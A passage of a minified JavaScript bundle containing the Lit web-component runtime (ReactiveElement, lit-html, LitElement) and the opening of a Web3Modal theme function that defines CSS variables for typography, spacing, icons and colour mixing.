k2(r,t,Ly)},qH=(t,e)=>{if($y)t.adoptedStyleSheets=e.map(r=>r instanceof CSSStyleSheet?r:r.styleSheet);else for(const r of e){const n=document.createElement("style"),i=fd.litNonce;i!==void 0&&n.setAttribute("nonce",i),n.textContent=r.cssText,t.appendChild(n)}},GE=$y?t=>t:t=>t instanceof CSSStyleSheet?(e=>{let r="";for(const n of e.cssRules)r+=n.cssText;return Fn(r)})(t):t;/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const{is:zH,defineProperty:HH,getOwnPropertyDescriptor:WH,getOwnPropertyNames:GH,getOwnPropertySymbols:VH,getPrototypeOf:KH}=Object,eo=globalThis,VE=eo.trustedTypes,QH=VE?VE.emptyScript:"",kg=eo.reactiveElementPolyfillSupport,ku=(t,e)=>t,S0={toAttribute(t,e){switch(e){case Boolean:t=t?QH:null;break;case Object:case Array:t=t==null?t:JSON.stringify(t)}return t},fromAttribute(t,e){let r=t;switch(e){case Boolean:r=t!==null;break;case Number:r=t===null?null:Number(t);break;case Object:case Array:try{r=JSON.parse(t)}catch{r=null}}return r}},D2=(t,e)=>!zH(t,e),KE={attribute:!0,type:String,converter:S0,reflect:!1,useDefault:!1,hasChanged:D2};Symbol.metadata??(Symbol.metadata=Symbol("metadata")),eo.litPropertyMetadata??(eo.litPropertyMetadata=new WeakMap);let Ya=class extends HTMLElement{static addInitializer(e){this._$Ei(),(this.l??(this.l=[])).push(e)}static get observedAttributes(){return this.finalize(),this._$Eh&&[...this._$Eh.keys()]}static createProperty(e,r=KE){if(r.state&&(r.attribute=!1),this._$Ei(),this.prototype.hasOwnProperty(e)&&((r=Object.create(r)).wrapped=!0),this.elementProperties.set(e,r),!r.noAccessor){const n=Symbol(),i=this.getPropertyDescriptor(e,n,r);i!==void 0&&HH(this.prototype,e,i)}}static getPropertyDescriptor(e,r,n){const{get:i,set:s}=WH(this.prototype,e)??{get(){return this[r]},set(o){this[r]=o}};return{get:i,set(o){const a=i==null?void 0:i.call(this);s==null||s.call(this,o),this.requestUpdate(e,a,n)},configurable:!0,enumerable:!0}}static getPropertyOptions(e){return this.elementProperties.get(e)??KE}static _$Ei(){if(this.hasOwnProperty(ku("elementProperties")))return;const e=KH(this);e.finalize(),e.l!==void 0&&(this.l=[...e.l]),this.elementProperties=new Map(e.elementProperties)}static finalize(){if(this.hasOwnProperty(ku("finalized")))return;if(this.finalized=!0,this._$Ei(),this.hasOwnProperty(ku("properties"))){const r=this.properties,n=[...GH(r),...VH(r)];for(const i of n)this.createProperty(i,r[i])}const e=this[Symbol.metadata];if(e!==null){const r=litPropertyMetadata.get(e);if(r!==void 0)for(const[n,i]of r)this.elementProperties.set(n,i)}this._$Eh=new Map;for(const[r,n]of this.elementProperties){const i=this._$Eu(r,n);i!==void 0&&this._$Eh.set(i,r)}this.elementStyles=this.finalizeStyles(this.styles)}static finalizeStyles(e){const r=[];if(Array.isArray(e)){const n=new Set(e.flat(1/0).reverse());for(const i of n)r.unshift(GE(i))}else e!==void 0&&r.push(GE(e));return r}static _$Eu(e,r){const n=r.attribute;return n===!1?void 0:typeof n=="string"?n:typeof e=="string"?e.toLowerCase():void 0}constructor(){super(),this._$Ep=void 0,this.isUpdatePending=!1,this.hasUpdated=!1,this._$Em=null,this._$Ev()}_$Ev(){var e;this._$ES=new Promise(r=>this.enableUpdating=r),this._$AL=new Map,this._$E_(),this.requestUpdate(),(e=this.constructor.l)==null||e.forEach(r=>r(this))}addController(e){var r;(this._$EO??(this._$EO=new Set)).add(e),this.renderRoot!==void 0&&this.isConnected&&((r=e.hostConnected)==null||r.call(e))}removeController(e){var r;(r=this._$EO)==null||r.delete(e)}_$E_(){const e=new Map,r=this.constructor.elementProperties;for(const n of r.keys())this.hasOwnProperty(n)&&(e.set(n,this[n]),delete this[n]);e.size>0&&(this._$Ep=e)}createRenderRoot(){const e=this.shadowRoot??this.attachShadow(this.constructor.shadowRootOptions);return qH(e,this.constructor.elementStyles),e}connectedCallback(){var e;this.renderRoot??(this.renderRoot=this.createRenderRoot()),this.enableUpdating(!0),(e=this._$EO)==null||e.forEach(r=>{var n;return(n=r.hostConnected)==null?void 0:n.call(r)})}enableUpdating(e){}disconnectedCallback(){var e;(e=this._$EO)==null||e.forEach(r=>{var n;return(n=r.hostDisconnected)==null?void 0:n.call(r)})}attributeChangedCallback(e,r,n){this._$AK(e,n)}_$ET(e,r){var s;const n=this.constructor.elementProperties.get(e),i=this.constructor._$Eu(e,n);if(i!==void 0&&n.reflect===!0){const o=(((s=n.converter)==null?void 0:s.toAttribute)!==void 0?n.converter:S0).toAttribute(r,n.type);this._$Em=e,o==null?this.removeAttribute(i):this.setAttribute(i,o),this._$Em=null}}_$AK(e,r){var s,o;const n=this.constructor,i=n._$Eh.get(e);if(i!==void 0&&this._$Em!==i){const a=n.getPropertyOptions(i),c=typeof a.converter=="function"?{fromAttribute:a.converter}:((s=a.converter)==null?void 0:s.fromAttribute)!==void 0?a.converter:S0;this._$Em=i,this[i]=c.fromAttribute(r,a.type)??((o=this._$Ej)==null?void 0:o.get(i))??null,this._$Em=null}}requestUpdate(e,r,n){var i;if(e!==void 0){const s=this.constructor,o=this[e];if(n??(n=s.getPropertyOptions(e)),!((n.hasChanged??D2)(o,r)||n.useDefault&&n.reflect&&o===((i=this._$Ej)==null?void 0:i.get(e))&&!this.hasAttribute(s._$Eu(e,n))))return;this.C(e,r,n)}this.isUpdatePending===!1&&(this._$ES=this._$EP())}C(e,r,{useDefault:n,reflect:i,wrapped:s},o){n&&!(this._$Ej??(this._$Ej=new Map)).has(e)&&(this._$Ej.set(e,o??r??this[e]),s!==!0||o!==void 0)||(this._$AL.has(e)||(this.hasUpdated||n||(r=void 0),this._$AL.set(e,r)),i===!0&&this._$Em!==e&&(this._$Eq??(this._$Eq=new Set)).add(e))}async _$EP(){this.isUpdatePending=!0;try{await this._$ES}catch(r){Promise.reject(r)}const e=this.scheduleUpdate();return e!=null&&await e,!this.isUpdatePending}scheduleUpdate(){return this.performUpdate()}performUpdate(){var n;if(!this.isUpdatePending)return;if(!this.hasUpdated){if(this.renderRoot??(this.renderRoot=this.createRenderRoot()),this._$Ep){for(const[s,o]of this._$Ep)this[s]=o;this._$Ep=void 0}const i=this.constructor.elementProperties;if(i.size>0)for(const[s,o]of i){const{wrapped:a}=o,c=this[s];a!==!0||this._$AL.has(s)||c===void 0||this.C(s,void 0,o,c)}}let e=!1;const r=this._$AL;try{e=this.shouldUpdate(r),e?(this.willUpdate(r),(n=this._$EO)==null||n.forEach(i=>{var s;return(s=i.hostUpdate)==null?void 0:s.call(i)}),this.update(r)):this._$EM()}catch(i){throw e=!1,this._$EM(),i}e&&this._$AE(r)}willUpdate(e){}_$AE(e){var r;(r=this._$EO)==null||r.forEach(n=>{var i;return(i=n.hostUpdated)==null?void 0:i.call(n)}),this.hasUpdated||(this.hasUpdated=!0,this.firstUpdated(e)),this.updated(e)}_$EM(){this._$AL=new Map,this.isUpdatePending=!1}get updateComplete(){return this.getUpdateComplete()}getUpdateComplete(){return this._$ES}shouldUpdate(e){return!0}update(e){this._$Eq&&(this._$Eq=this._$Eq.forEach(r=>this._$ET(r,this[r]))),this._$EM()}updated(e){}firstUpdated(e){}};Ya.elementStyles=[],Ya.shadowRootOptions={mode:"open"},Ya[ku("elementProperties")]=new Map,Ya[ku("finalized")]=new Map,kg==null||kg({ReactiveElement:Ya}),(eo.reactiveElementVersions??(eo.reactiveElementVersions=[])).push("2.1.0");/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const Du=globalThis,ef=Du.trustedTypes,QE=ef?ef.createPolicy("lit-html",{createHTML:t=>t}):void 0,M2="$lit$",Ws=`lit$${Math.random().toFixed(9).slice(2)}$`,B2="?"+Ws,YH=`<${B2}>`,da=document,Pl=()=>da.createComment(""),Rl=t=>t===null||typeof t!="object"&&typeof t!="function",Fy=Array.isArray,JH=t=>Fy(t)||typeof(t==null?void 0:t[Symbol.iterator])=="function",Dg=`[ 	
\f\r]`,pu=/<(?:(!--|\/[^a-zA-Z])|(\/?[a-zA-Z][^>\s]*)|(\/?$))/g,YE=/-->/g,JE=/>/g,So=RegExp(`>|${Dg}(?:([^\\s"'>=/]+)(${Dg}*=${Dg}*(?:[^ 	
\f\r"'\`<>=]|("|')|))|$)`,"g"),ZE=/'/g,XE=/"/g,U2=/^(?:script|style|textarea|title)$/i,$2=t=>(e,...r)=>({_$litType$:t,strings:e,values:r}),pJ=$2(1),gJ=$2(2),Sc=Symbol.for("lit-noChange"),Er=Symbol.for("lit-nothing"),eA=new WeakMap,zo=da.createTreeWalker(da,129);function L2(t,e){if(!Fy(t)||!t.hasOwnProperty("raw"))throw Error("invalid template strings array");return QE!==void 0?QE.createHTML(e):e}const ZH=(t,e)=>{const r=t.length-1,n=[];let i,s=e===2?"<svg>":e===3?"<math>":"",o=pu;for(let a=0;a<r;a++){const c=t[a];let u,l,h=-1,d=0;for(;d<c.length&&(o.lastIndex=d,l=o.exec(c),l!==null);)d=o.lastIndex,o===pu?l[1]==="!--"?o=YE:l[1]!==void 0?o=JE:l[2]!==void 0?(U2.test(l[2])&&(i=RegExp("</"+l[2],"g")),o=So):l[3]!==void 0&&(o=So):o===So?l[0]===">"?(o=i??pu,h=-1):l[1]===void 0?h=-2:(h=o.lastIndex-l[2].length,u=l[1],o=l[3]===void 0?So:l[3]==='"'?XE:ZE):o===XE||o===ZE?o=So:o===YE||o===JE?o=pu:(o=So,i=void 0);const g=o===So&&t[a+1].startsWith("/>")?" ":"";s+=o===pu?c+YH:h>=0?(n.push(u),c.slice(0,h)+M2+c.slice(h)+Ws+g):c+Ws+(h===-2?a:g)}return[L2(t,s+(t[r]||"<?>")+(e===2?"</svg>":e===3?"</math>":"")),n]};class Ol{constructor({strings:e,_$litType$:r},n){let i;this.parts=[];let s=0,o=0;const a=e.length-1,c=this.parts,[u,l]=ZH(e,r);if(this.el=Ol.createElement(u,n),zo.currentNode=this.el.content,r===2||r===3){const h=this.el.content.firstChild;h.replaceWith(...h.childNodes)}for(;(i=zo.nextNode())!==null&&c.length<a;){if(i.nodeType===1){if(i.hasAttributes())for(const h of i.getAttributeNames())if(h.endsWith(M2)){const d=l[o++],g=i.getAttribute(h).split(Ws),y=/([.?@])?(.*)/.exec(d);c.push({type:1,index:s,name:y[2],strings:g,ctor:y[1]==="."?eW:y[1]==="?"?tW:y[1]==="@"?rW:Qf}),i.removeAttribute(h)}else h.startsWith(Ws)&&(c.push({type:6,index:s}),i.removeAttribute(h));if(U2.test(i.tagName)){const h=i.textContent.split(Ws),d=h.length-1;if(d>0){i.textContent=ef?ef.emptyScript:"";for(let g=0;g<d;g++)i.append(h[g],Pl()),zo.nextNode(),c.push({type:2,index:++s});i.append(h[d],Pl())}}}else if(i.nodeType===8)if(i.data===B2)c.push({type:2,index:s});else{let h=-1;for(;(h=i.data.indexOf(Ws,h+1))!==-1;)c.push({type:7,index:s}),h+=Ws.length-1}s++}}static createElement(e,r){const n=da.createElement("template");return n.innerHTML=e,n}}function Nc(t,e,r=t,n){var o,a;if(e===Sc)return e;let i=n!==void 0?(o=r._$Co)==null?void 0:o[n]:r._$Cl;const s=Rl(e)?void 0:e._$litDirective$;return(i==null?void 0:i.constructor)!==s&&((a=i==null?void 0:i._$AO)==null||a.call(i,!1),s===void 0?i=void 0:(i=new s(t),i._$AT(t,r,n)),n!==void 0?(r._$Co??(r._$Co=[]))[n]=i:r._$Cl=i),i!==void 0&&(e=Nc(t,i._$AS(t,e.values),i,n)),e}class XH{constructor(e,r){this._$AV=[],this._$AN=void 0,this._$AD=e,this._$AM=r}get parentNode(){return this._$AM.parentNode}get _$AU(){return this._$AM._$AU}u(e){const{el:{content:r},parts:n}=this._$AD,i=((e==null?void 0:e.creationScope)??da).importNode(r,!0);zo.currentNode=i;let s=zo.nextNode(),o=0,a=0,c=n[0];for(;c!==void 0;){if(o===c.index){let u;c.type===2?u=new ph(s,s.nextSibling,this,e):c.type===1?u=new c.ctor(s,c.name,c.strings,this,e):c.type===6&&(u=new nW(s,this,e)),this._$AV.push(u),c=n[++a]}o!==(c==null?void 0:c.index)&&(s=zo.nextNode(),o++)}return zo.currentNode=da,i}p(e){let r=0;for(const n of this._$AV)n!==void 0&&(n.strings!==void 0?(n._$AI(e,n,r),r+=n.strings.length-2):n._$AI(e[r])),r++}}class ph{get _$AU(){var e;return((e=this._$AM)==null?void 0:e._$AU)??this._$Cv}constructor(e,r,n,i){this.type=2,this._$AH=Er,this._$AN=void 0,this._$AA=e,this._$AB=r,this._$AM=n,this.options=i,this._$Cv=(i==null?void 0:i.isConnected)??!0}get parentNode(){let e=this._$AA.parentNode;const r=this._$AM;return r!==void 0&&(e==null?void 0:e.nodeType)===11&&(e=r.parentNode),e}get startNode(){return this._$AA}get endNode(){return this._$AB}_$AI(e,r=this){e=Nc(this,e,r),Rl(e)?e===Er||e==null||e===""?(this._$AH!==Er&&this._$AR(),this._$AH=Er):e!==this._$AH&&e!==Sc&&this._(e):e._$litType$!==void 0?this.$(e):e.nodeType!==void 0?this.T(e):JH(e)?this.k(e):this._(e)}O(e){return this._$AA.parentNode.insertBefore(e,this._$AB)}T(e){this._$AH!==e&&(this._$AR(),this._$AH=this.O(e))}_(e){this._$AH!==Er&&Rl(this._$AH)?this._$AA.nextSibling.data=e:this.T(da.createTextNode(e)),this._$AH=e}$(e){var s;const{values:r,_$litType$:n}=e,i=typeof n=="number"?this._$AC(e):(n.el===void 0&&(n.el=Ol.createElement(L2(n.h,n.h[0]),this.options)),n);if(((s=this._$AH)==null?void 0:s._$AD)===i)this._$AH.p(r);else{const o=new XH(i,this),a=o.u(this.options);o.p(r),this.T(a),this._$AH=o}}_$AC(e){let r=eA.get(e.strings);return r===void 0&&eA.set(e.strings,r=new Ol(e)),r}k(e){Fy(this._$AH)||(this._$AH=[],this._$AR());const r=this._$AH;let n,i=0;for(const s of e)i===r.length?r.push(n=new ph(this.O(Pl()),this.O(Pl()),this,this.options)):n=r[i],n._$AI(s),i++;i<r.length&&(this._$AR(n&&n._$AB.nextSibling,i),r.length=i)}_$AR(e=this._$AA.nextSibling,r){var n;for((n=this._$AP)==null?void 0:n.call(this,!1,!0,r);e&&e!==this._$AB;){const i=e.nextSibling;e.remove(),e=i}}setConnected(e){var r;this._$AM===void 0&&(this._$Cv=e,(r=this._$AP)==null||r.call(this,e))}}class Qf{get tagName(){return this.element.tagName}get _$AU(){return this._$AM._$AU}constructor(e,r,n,i,s){this.type=1,this._$AH=Er,this._$AN=void 0,this.element=e,this.name=r,this._$AM=i,this.options=s,n.length>2||n[0]!==""||n[1]!==""?(this._$AH=Array(n.length-1).fill(new String),this.strings=n):this._$AH=Er}_$AI(e,r=this,n,i){const s=this.strings;let o=!1;if(s===void 0)e=Nc(this,e,r,0),o=!Rl(e)||e!==this._$AH&&e!==Sc,o&&(this._$AH=e);else{const a=e;let c,u;for(e=s[0],c=0;c<s.length-1;c++)u=Nc(this,a[n+c],r,c),u===Sc&&(u=this._$AH[c]),o||(o=!Rl(u)||u!==this._$AH[c]),u===Er?e=Er:e!==Er&&(e+=(u??"")+s[c+1]),this._$AH[c]=u}o&&!i&&this.j(e)}j(e){e===Er?this.element.removeAttribute(this.name):this.element.setAttribute(this.name,e??"")}}class eW extends Qf{constructor(){super(...arguments),this.type=3}j(e){this.element[this.name]=e===Er?void 0:e}}class tW extends Qf{constructor(){super(...arguments),this.type=4}j(e){this.element.toggleAttribute(this.name,!!e&&e!==Er)}}class rW extends Qf{constructor(e,r,n,i,s){super(e,r,n,i,s),this.type=5}_$AI(e,r=this){if((e=Nc(this,e,r,0)??Er)===Sc)return;const n=this._$AH,i=e===Er&&n!==Er||e.capture!==n.capture||e.once!==n.once||e.passive!==n.passive,s=e!==Er&&(n===Er||i);i&&this.element.removeEventListener(this.name,this,n),s&&this.element.addEventListener(this.name,this,e),this._$AH=e}handleEvent(e){var r;typeof this._$AH=="function"?this._$AH.call(((r=this.options)==null?void 0:r.host)??this.element,e):this._$AH.handleEvent(e)}}class nW{constructor(e,r,n){this.element=e,this.type=6,this._$AN=void 0,this._$AM=r,this.options=n}get _$AU(){return this._$AM._$AU}_$AI(e){Nc(this,e)}}const Mg=Du.litHtmlPolyfillSupport;Mg==null||Mg(Ol,ph),(Du.litHtmlVersions??(Du.litHtmlVersions=[])).push("3.3.0");const iW=(t,e,r)=>{const n=(r==null?void 0:r.renderBefore)??e;let i=n._$litPart$;if(i===void 0){const s=(r==null?void 0:r.renderBefore)??null;n._$litPart$=i=new ph(e.insertBefore(Pl(),s),s,void 0,r??{})}return i._$AI(t),i};/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const Yo=globalThis;class pd extends Ya{constructor(){super(...arguments),this.renderOptions={host:this},this._$Do=void 0}createRenderRoot(){var r;const e=super.createRenderRoot();return(r=this.renderOptions).renderBefore??(r.renderBefore=e.firstChild),e}update(e){const r=this.render();this.hasUpdated||(this.renderOptions.isConnected=this.isConnected),super.update(e),this._$Do=iW(r,this.renderRoot,this.renderOptions)}connectedCallback(){var e;super.connectedCallback(),(e=this._$Do)==null||e.setConnected(!0)}disconnectedCallback(){var e;super.disconnectedCallback(),(e=this._$Do)==null||e.setConnected(!1)}render(){return Sc}}var x1;pd._$litElement$=!0,pd.finalized=!0,(x1=Yo.litElementHydrateSupport)==null||x1.call(Yo,{LitElement:pd});const Bg=Yo.litElementPolyfillSupport;Bg==null||Bg({LitElement:pd});(Yo.litElementVersions??(Yo.litElementVersions=[])).push("4.2.0");let Mu,to,ro;function mJ(t,e){Mu=document.createElement("style"),to=document.createElement("style"),ro=document.createElement("style"),Mu.textContent=cc(t).core.cssText,to.textContent=cc(t).dark.cssText,ro.textContent=cc(t).light.cssText,document.head.appendChild(Mu),document.head.appendChild(to),document.head.appendChild(ro),F2(e)}function F2(t){to&&ro&&(t==="light"?(to.removeAttribute("media"),ro.media="enabled"):(ro.removeAttribute("media"),to.media="enabled"))}function sW(t){Mu&&to&&ro&&(Mu.textContent=cc(t).core.cssText,to.textContent=cc(t).dark.cssText,ro.textContent=cc(t).light.cssText)}function cc(t){return{core:ac`
      @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
      @keyframes w3m-shake {
        0% {
          transform: scale(1) rotate(0deg);
        }
        20% {
          transform: scale(1) rotate(-1deg);
        }
        40% {
          transform: scale(1) rotate(1.5deg);
        }
        60% {
          transform: scale(1) rotate(-1.5deg);
        }
        80% {
          transform: scale(1) rotate(1deg);
        }
        100% {
          transform: scale(1) rotate(0deg);
        }
      }
      @keyframes w3m-iframe-fade-out {
        0% {
          opacity: 1;
        }
        100% {
          opacity: 0;
        }
      }
      @keyframes w3m-iframe-zoom-in {
        0% {
          transform: translateY(50px);
          opacity: 0;
        }
        100% {
          transform: translateY(0px);
          opacity: 1;
        }
      }
      @keyframes w3m-iframe-zoom-in-mobile {
        0% {
          transform: scale(0.95);
          opacity: 0;
        }
        100% {
          transform: scale(1);
          opacity: 1;
        }
      }
      :root {
        --w3m-modal-width: 360px;
        --w3m-color-mix-strength: ${Fn(t!=null&&t["--w3m-color-mix-strength"]?`${t["--w3m-color-mix-strength"]}%`:"0%")};
        --w3m-font-family: ${Fn((t==null?void 0:t["--w3m-font-family"])||"Inter, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;")};
        --w3m-font-size-master: ${Fn((t==null?void 0:t["--w3m-font-size-master"])||"10px")};
        --w3m-border-radius-master: ${Fn((t==null?void 0:t["--w3m-border-radius-master"])||"4px")};
        --w3m-z-index: ${Fn((t==null?void 0:t["--w3m-z-index"])||999)};

        --wui-font-family: var(--w3m-font-family);

        --wui-font-size-mini: calc(var(--w3m-font-size-master) * 0.8);
        --wui-font-size-micro: var(--w3m-font-size-master);
        --wui-font-size-tiny: calc(var(--w3m-font-size-master) * 1.2);
        --wui-font-size-small: calc(var(--w3m-font-size-master) * 1.4);
        --wui-font-size-paragraph: calc(var(--w3m-font-size-master) * 1.6);
        --wui-font-size-medium: calc(var(--w3m-font-size-master) * 1.8);
        --wui-font-size-large: calc(var(--w3m-font-size-master) * 2);
        --wui-font-size-title-6: calc(var(--w3m-font-size-master) * 2.2);
        --wui-font-size-medium-title: calc(var(--w3m-font-size-master) * 2.4);
        --wui-font-size-2xl: calc(var(--w3m-font-size-master) * 4);

        --wui-border-radius-5xs: var(--w3m-border-radius-master);
        --wui-border-radius-4xs: calc(var(--w3m-border-radius-master) * 1.5);
        --wui-border-radius-3xs: calc(var(--w3m-border-radius-master) * 2);
        --wui-border-radius-xxs: calc(var(--w3m-border-radius-master) * 3);
        --wui-border-radius-xs: calc(var(--w3m-border-radius-master) * 4);
        --wui-border-radius-s: calc(var(--w3m-border-radius-master) * 5);
        --wui-border-radius-m: calc(var(--w3m-border-radius-master) * 7);
        --wui-border-radius-l: calc(var(--w3m-border-radius-master) * 9);
        --wui-border-radius-3xl: calc(var(--w3m-border-radius-master) * 20);

        --wui-font-weight-light: 400;
        --wui-font-weight-regular: 500;
        --wui-font-weight-medium: 600;
        --wui-font-weight-bold: 700;

        --wui-letter-spacing-2xl: -1.6px;
        --wui-letter-spacing-medium-title: -0.96px;
        --wui-letter-spacing-title-6: -0.88px;
        --wui-letter-spacing-large: -0.8px;
        --wui-letter-spacing-medium: -0.72px;
        --wui-letter-spacing-paragraph: -0.64px;
        --wui-letter-spacing-small: -0.56px;
        --wui-letter-spacing-tiny: -0.48px;
        --wui-letter-spacing-micro: -0.2px;
        --wui-letter-spacing-mini: -0.16px;

        --wui-spacing-0: 0px;
        --wui-spacing-4xs: 2px;
        --wui-spacing-3xs: 4px;
        --wui-spacing-xxs: 6px;
        --wui-spacing-2xs: 7px;
        --wui-spacing-xs: 8px;
        --wui-spacing-1xs: 10px;
        --wui-spacing-s: 12px;
        --wui-spacing-m: 14px;
        --wui-spacing-l: 16px;
        --wui-spacing-2l: 18px;
        --wui-spacing-xl: 20px;
        --wui-spacing-xxl: 24px;
        --wui-spacing-2xl: 32px;
        --wui-spacing-3xl: 40px;
        --wui-spacing-4xl: 90px;
        --wui-spacing-5xl: 95px;

        --wui-icon-box-size-xxs: 14px;
        --wui-icon-box-size-xs: 20px;
        --wui-icon-box-size-sm: 24px;
        --wui-icon-box-size-md: 32px;
        --wui-icon-box-size-mdl: 36px;
        --wui-icon-box-size-lg: 40px;
        --wui-icon-box-size-2lg: 48px;
        --wui-icon-box-size-xl: 64px;

        --wui-icon-size-inherit: inherit;
        --wui-icon-size-xxs: 10px;
        --wui-icon-size-xs: 12px;
        --wui-icon-size-sm: 14px;
        --wui-icon-size-md: 16px;
        --wui-icon-size-mdl: 18px;
        --wui-icon-size-lg: 20px;
        --wui-icon-size-xl: 24px;
        --wui-icon-size-xxl: 28px;

        --wui-wallet-image-size-inherit: inherit;
        --wui-wallet-image-size-sm: 40px;
        --wui-wallet-image-size-md: 56px;
        --wui-wallet-image-size-lg: 80px;

        --wui-visual-size-size-inherit: inherit;
        --wui-visual-size-sm: 40px;
        --wui-visual-size-md: 55px;
        --wui-visual-size-lg: 80px;

        --wui-box-size-md: 100px;
        --wui-box-size-lg: 120px;

        --wui-ease-out-power-2: cubic-bezier(0, 0, 0.22, 1);
        --wui-ease-out-power-1: cubic-bezier(0, 0, 0.55, 1);

        --wui-ease-in-power-3: cubic-bezier(0.66, 0, 1, 1);
        --wui-ease-in-power-2: cubic-bezier(0.45, 0, 1, 1);
        --wui-ease-in-power-1: cubic-bezier(0.3, 0, 1, 1);

        --wui-ease-inout-power-1: cubic-bezier(0.45, 0, 0.55, 1);

        --wui-duration-lg: 200ms;
        --wui-duration-md: 125ms;
        --wui-duration-sm: 75ms;

        --wui-path-network-sm: path(
          'M15.4 2.1a5.21 5.21 0 0 1 5.2 0l11.61 6.7a5.21 5.21 0 0 1 2.61 4.52v13.4c0 1.87-1 3.59-2.6 4.52l-11.61 6.7c-1.62.93-3.6.93-5.22 0l-11.6-6.7a5.21 5.21 0 0 1-2.61-4.51v-13.4c0-1.87 1-3.6 2.6-4.52L15.4 2.1Z'
        );

        --wui-path-network-md: path(
          'M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z'
        );

        --wui-path-network-lg: path(
          'M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z'
        );

        --wui-width-network-sm: 36px;
        --wui-width-network-md: 48px;
        --wui-width-network-lg: 86px;

        --wui-height-network-sm: 40px;
        --wui-height-network-md: 54px;
        --wui-height-network-lg: 96px;

        --wui-icon-size-network-xs: 12px;
        --wui-icon-size-network-sm: 16px;
        --wui-icon-size-network-md: 24px;
        --wui-icon-size-network-lg: 42px;

        --wui-color-inherit: inherit;

        --wui-color-inverse-100: #fff;
        --wui-color-inverse-000: #000;

        --wui-cover: rgba(20, 20, 20, 0.8);

        --wui-color-modal-bg: var(--wui-color-modal-bg-base);

        --wui-color-accent-100: var(--wui-color-accent-base-100);
        --wui-color-accent-090: var(--wui-color-accent-base-090);
        --wui-color-accent-080: var(--wui-color-accent-base-080);

        --wui-color-success-100: var(--wui-color-success-base-100);
        --wui-color-success-125: var(--wui-color-success-base-125);

        --wui-color-warning-100: var(--wui-color-warning-base-100);

        --wui-color-error-100: var(--wui-color-error-base-100);
        --wui-color-error-125: var(--wui-color-error-base-125);

        --wui-color-blue-100: var(--wui-color-blue-base-100);
        --wui-color-blue-90: var(--wui-color-blue-base-90);

        --wui-icon-box-bg-error-100: var(--wui-icon-box-bg-error-base-100);
        --wui-icon-box-bg-blue-100: var(--wui-icon-box-bg-blue-base-100);
        --wui-icon-box-bg-success-100: var(--wui-icon-box-bg-success-base-100);
        --wui-icon-box-bg-inverse-100: var(--wui-icon-box-bg-inverse-base-100);

        --wui-all-wallets-bg-100: var(--wui-all-wallets-bg-100);

        --wui-avatar-border: var(--wui-avatar-border-base);

        --wui-thumbnail-border: var(--wui-thumbnail-border-base);

        --wui-wallet-button-bg: var(--wui-wallet-button-bg-base);

        --wui-box-shadow-blue: var(--wui-color-accent-glass-020);
      }

      @supports (background: color-mix(in srgb, white 50%, black)) {
        :root {
          --wui-color-modal-bg: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-modal-bg-base)
          );

          --wui-box-shadow-blue: color-mix(in srgb, var(--wui-color-accent-100) 20%, transparent);

          --wui-color-accent-100: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 100%,
            transparent
          );
          --wui-color-accent-090: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 90%,
            transparent
          );
          --wui-color-accent-080: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 80%,
            transparent
          );
          --wui-color-accent-glass-090: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 90%,
            transparent
          );
          --wui-color-accent-glass-080: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 80%,
            transparent
          );
          --wui-color-accent-glass-020: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 20%,
            transparent
          );
          --wui-color-accent-glass-015: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 15%,
            transparent
          );
          --wui-color-accent-glass-010: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 10%,
            transparent
          );
          --wui-color-accent-glass-005: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 5%,
            transparent
          );
          --wui-color-accent-002: color-mix(
            in srgb,
            var(--wui-color-accent-base-100) 2%,
            transparent
          );

          --wui-color-fg-100: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-100)
          );
          --wui-color-fg-125: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-125)
          );
          --wui-color-fg-150: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-150)
          );
          --wui-color-fg-175: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-175)
          );
          --wui-color-fg-200: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-200)
          );
          --wui-color-fg-225: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-225)
          );
          --wui-color-fg-250: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-250)
          );
          --wui-color-fg-275: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-275)
          );
          --wui-color-fg-300: color-mix(
            in srgb,
            var(--w3m-color-mix) var(--w3m-color-mix-strength),
            var(--wui-color-fg-300)
          );
